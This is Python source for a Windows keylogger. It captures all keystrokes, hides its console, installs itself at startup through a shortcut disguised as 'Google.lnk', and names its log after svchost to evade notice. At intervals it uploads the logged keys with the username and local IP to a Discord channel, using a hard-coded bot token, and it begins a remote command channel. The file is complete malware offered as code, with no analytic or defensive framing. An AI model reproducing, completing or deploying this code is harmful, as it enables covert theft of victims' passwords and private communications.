import discord
import asyncio
import json
import os
import sys
import time
from win32com.client import Dispatch
from pynput import keyboard
import ctypes
import win32process
"""from update import *"""
import socket


def disable_window():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.system('taskkill /PID ' + str(pid) + ' /f')


def version():
    VERSION = 1
    return VERSION


def rename_this_file(new_name):
    try:
        for i in range(-1, -len(sys.argv[0]), -1):
            if (sys.argv[0][i] == '/') or (sys.argv[0][i] == "\\"):
                exe_file_name = sys.argv[0][(len(sys.argv[0]) + i + 1):]
                break
    except:
        return
    wdir = os.getcwd()
    old_file = wdir + '\\' + exe_file_name
    new_file = wdir + '\\' + new_name
    os.rename(old_file, new_file)


class Config:
    def __init__(self):
        self.file_dimension_send = 10000
        self.send_on_connect = True
        self.send_file_timer = 1800
        self.write_file_timer = 300
        self.log_file = 'svchost.file'
        self.discord_bot_TOKEN = 'NTg1MzU4NzIzMDc0MjI4MjM0.XPYTyw.lS_2qXkWau6x_5S-PcBk6wsg1Mo'
        self.discord_channel_command = "commands"
        self.discord_channel_upload_keys = 'upload_keys'
        self.discord_channel_upload_general = 'upload_general'
        self.discord_channel_update_exe = "update_exe"
        self.user_id = None

    def set(self, file_path):
        def load_json(file_path, dictionary):
            with open(file_path) as data_file:
                dictionary.update(json.load(data_file))
        config = {}
        load_json(file_path, config)
        self.file_dimension_send = config.get("file_dimension_send") or self.file_dimension_send
        self.send_on_connect = config.get("send_on_connect") or self.send_on_connect
        self.send_file_timer = config.get("send_file_timer") or self.send_file_timer
        self.write_file_timer = config.get("write_file_timer") or self.write_file_timer
        self.log_file = config.get("log_file") or self.log_file
        self.discord_bot_TOKEN = config.get("discord_bot_TOKEN") or self.discord_bot_TOKEN
        self.discord_channel_command = config.get("discord_channel_command") or self.discord_channel_command
        self.discord_channel_upload_keys = config.get("discord_channel_upload_keys") or self.discord_channel_upload_keys
        self.discord_channel_upload_general = config.get("discord_channel_upload_general") or self.discord_channel_upload_general
        self.discord_channel_update_exe = config.get("discord_channel_update_exe") or self.discord_channel_upload_general
        self.user_id = config.get("user_id") or self.user_id


def create_shortcut_startup():
    try:
        for i in range(-1, -len(sys.argv[0]), -1):
            if (sys.argv[0][i] == '/') or (sys.argv[0][i] == "\\"):
                exe_file_name = sys.argv[0][(len(sys.argv[0]) + i + 1):]
                break
        print("Name of exe: " + exe_file_name)
        print("sys.argv[0]: " + sys.argv[0])
    except:
        return

    name_shortcut = 'Google.lnk'
    start_up_path = 'C:/Users/' + os.getlogin() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
    path = os.path.join(start_up_path, name_shortcut)
    wdir = os.getcwd()
    target = wdir + '\\' + exe_file_name
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    print("Link directory: " + os.getcwd())
    print("Link target:    " + target)

    if os.path.isfile(start_up_path + '/' + name_shortcut):
        if shortcut.Targetpath != target or shortcut.WorkingDirectory != wdir:
            shortcut.Targetpath = target
            shortcut.WorkingDirectory = wdir
            shortcut.save()
    else:
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = wdir
        shortcut.save()


class Timer:
    def __init__(self, loop=None):
        self.loop = asyncio.get_event_loop() if loop is None else loop
        self._timeout = None
        self._callback = None
        self._task = None

    def start_timer(self, timeout):
        self._timeout = timeout
        self._task = asyncio.ensure_future(self._job(), loop=self.loop)

    def set_callback(self, func):
        self._callback = func

    async def _job(self):
        await asyncio.sleep(self._timeout)
        await self._callback()

    def cancel(self):
        self._task.cancel()


class Connection:
    def __init__(self, loop=None):
        self.loop = asyncio.get_event_loop() if loop is None else loop
        self.client = discord.Client()
        """self.on_ready = self.client.event(self.on_ready)"""
        self.on_message = self.client.event(self.on_message)
        self.future = None

    async def on_ready(self):
        print('Logged in as')
        print(self.client.user.name)
        print(self.client.user.id)
        print('------')

    async def on_message(self, message):
        pass
        # print(message.content)
        # await message.channel.send('Hello! ' + message.author.name)

    def is_closed(self):
        return self.client.is_closed()

    async def start(self, token):
        async def runner():
            try:
                await self.client.start(token)
            finally:
                if not self.client.is_closed():
                    await self.client.close()
        await runner()

    async def close(self):
        await self.client.close()

    def get_all_channels(self):
        for guild in self.client.guilds:
            for channel in guild.channels:
                yield channel

    def channel_type(self, channel):
        words = str(discord._channel_factory(channel)).split()
        channel_category = ["<CATEGORYCHANNEL", "<VOICECHANNEL", "<TEXTCHANNEL"]
        for y in words:
            if y.upper() in channel_category:
                return y[1:]

    def get_channel(self, channel_name):
        channels = self.get_all_channels()
        for channel in channels:
            if channel.name.upper() == channel_name.upper():
                return channel

    async def send_file(self, channel_name, file_path=None, message_text=None):
        if not os.path.isfile(file_path):
            if len(message_text) <= 0:
                return
            file = None
        else:
            file = discord.File(file_path)
        try:
            await self.get_channel(channel_name).send(content=message_text, file=file)
        finally:
            pass

    async def get_last_message(self, channel_name):
        message = await self.get_channel(channel_name).fetch_message(self.get_channel(channel_name).last_message_id)
        return message

    async def get_messages(self, channel_name, limit=1):
        messages = []
        channel = self.get_channel(channel_name)
        async for msg in channel.history(limit=limit):
            messages.append(msg)
        return messages


class keyListner:
    def __init__(self, path, loop=None):
        self.loop = asyncio.get_event_loop() if loop is None else loop
        self.keys = []
        self.path = path
        self.event_callback = None
        self.future = None
        self.listener = None

    def on_event(self, func):
        self.event_callback = func

    def on_press(self, key):
        try:
            print(key.char)
            self.keys.append(key.char)
            if self.event_callback is not None:
                self.event_callback(key, "on_release")
        except AttributeError:
            print(key)
            self.keys.append(str(key))

    def on_release(self, key):
        try:
            self.keys.append(key.char + "[OUT]")
            print(key.char + " released")
            if self.event_callback is not None:
                self.event_callback(key, "on_release")
        except AttributeError:
            self.keys.append(str(key) + "[OUT]")
            print(str(key) + " released")

    def listen(self):
        async def runner():
            try:
                # Collect events until re3leased
                self.listener = keyboard.Listener(
                    on_press=self.on_press,
                    on_release=self.on_release)
                await self.listener.start()
            finally:
                pass
        self.future = asyncio.ensure_future(runner(), loop=self.loop)

    def write_to_file(self, path=None):
        if path is not None:
            self.path = path
        if len(self.keys) <= 0:
            return
        try:
            f = open(self.path, 'a+')
            f.write(self.keys.__str__()[1:-1] + ", ")
            f.close()
            self.keys.clear()
        except:
            pass

    def read_from_file(self, path=None):
        if path is not None:
            self.path = path
        if not os.path.isfile(path):
            return
        str = None
        try:
            f = open(self.path, 'r')
            str = f.read()
            f.close()
        except:
            pass
        return str


class Keylogger:
    def __init__(self, loop=None):
        self.loop = asyncio.get_event_loop() if loop is None else loop
        self.info = Config()
        self.info.set("config.json")
        self.connection = Connection(self.loop)
        self.on_ready = self.connection.client.event(self.on_ready)
        self.key_listner = None
        """self.updater = None"""
        self.write_timer = Timer()
        self.send_timer = Timer()
        self.on_ready = None
        self.closeable = True

    def init(self, token, keys_filepath, write_time):
        self.start_listening(keys_filepath)
        self.init_write_timer(write_time)
        """self.updater = Updater(self.connection, self.info, self.loop)"""
        self.loop.create_task(self.start_connection(token))

    async def on_ready(self):
        self.closeable = False
        self.init_send_timer(self.info.send_file_timer)
        await self.upload_keys()
        """await self.updater.update()"""
        self.closeable = True
        await self.close_connection()

    def run(self):
        self.init(self.info.discord_bot_TOKEN, self.info.log_file, self.info.write_file_timer)
        self.loop.run_forever()

    async def upload_keys(self):
        if os.stat(self.info.log_file).st_size <= 0:
            return
        if self.connection.is_closed():
            await self.start_connection(self.info.discord_bot_TOKEN)
        message = {
            "USER": os.getlogin(),
            "LOCAL_IP": socket.gethostbyname(socket.gethostname())
        }
        await self.connection.send_file(self.info.discord_channel_upload_keys, self.info.log_file, str(message))
        print("Payload sent")
        with open(self.info.log_file, "w"):
            pass

    def start_listening(self, path):
        self.key_listner = keyListner(path, self.loop)
        self.key_listner.listen()

    async def start_connection(self, token):
        await self.connection.start(token)

    async def close_connection(self):
        await self.connection.close()

    async def get_commands(self):
        async def gg():
            last_message = await self.connection.get_last_message(self.info.discord_channel_command)
            message_content = last_message.content
            special_words = ['!CHANGECFG', '!STOP', '!DESTROY', '!UPDATE']
            words = message_content.split('|')

    async def callback_write_timer(self):
        self.key_listner.write_to_file(self.info.log_file)
        self.write_timer.cancel()
        self.write_timer.start_timer(self.info.write_file_timer)

    async def callback_send_timer(self):
        await self.upload_keys()
        if self.closeable:
            await self.close_connection()
        self.send_timer.cancel()
        self.send_timer.start_timer(self.info.send_file_timer)

    async def callback_on_ready(self):
        if self.info.send_on_connect:
            self.loop.create_task(self.upload_keys())

    def init_write_timer(self, write_time=300):
        if write_time > 0:
            self.write_timer = Timer(self.loop)
            self.write_timer.set_callback(self.callback_write_timer)
            self.write_timer.start_timer(write_time)

    def init_send_timer(self, send_time=1800):
        if send_time > 0:
            self.send_timer = Timer(self.loop)
            self.send_timer.set_callback(self.callback_send_timer)
            self.send_timer.start_timer(send_time)

    def __del__(self):
        self.key_listner.write_to_file(self.info.log_file)
        self.close_connection()
        self.loop.close()


def main():
    # disable_window()
    """if "update" in sys.argv[1:]:
        new_name = "svchost.exe"
        time.sleep(2)
        os.remove(new_name)
        time.sleep(2)
        rename_this_file(new_name)
        print("updated")"""

    create_shortcut_startup()
    gg = Keylogger()
    gg.run()


if __name__ == "__main__":
    main()

